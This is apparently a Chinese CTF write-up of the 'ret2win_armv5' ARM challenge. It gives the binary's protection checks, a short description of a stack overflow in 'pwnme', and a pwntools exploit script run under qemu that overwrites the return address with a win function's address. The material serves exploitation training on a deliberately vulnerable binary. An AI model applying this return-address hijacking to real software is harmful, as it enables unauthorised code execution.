---
title: ret2win_armv5
date: 2023-03-23 17:35:17
categories: 
- pwn_wp
tags: 
- pwn
- arm
- stackoverflow


---

arm pwn入门题，arm下的ret2text。
<!-- more -->

### 查壳

```sh
# 32位动态链接
ret2win_armv5: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=a82dade296415721f90684517d0e6259d4ba2905, not stripped

# 只开了NX
[*] '/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/ret2win_armv5/ret2win_armv5'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)

```

### 逆向

程序比较简单，在`pwnme`中有一个栈溢出，可以溢出`20byte`，存在一个`ret2win`的后面，控制返回到它就可以了。

### exp

```py
from pwn import*
context(log_level='debug',os='linux',arch='arm')
filename='ret2win_armv5'
elf=ELF('./'+filename)
#libc=ELF('')
# p=process('./'+filename)
p=process(["qemu-arm", "-L", "/usr/arm-linux-gnueabi/", "./"+filename])
#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})
#p=remote('',)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()

ret2win=0x000105EC 
r()
payload=b'a'*0x24+p32(ret2win)
s(payload)

itr()

```

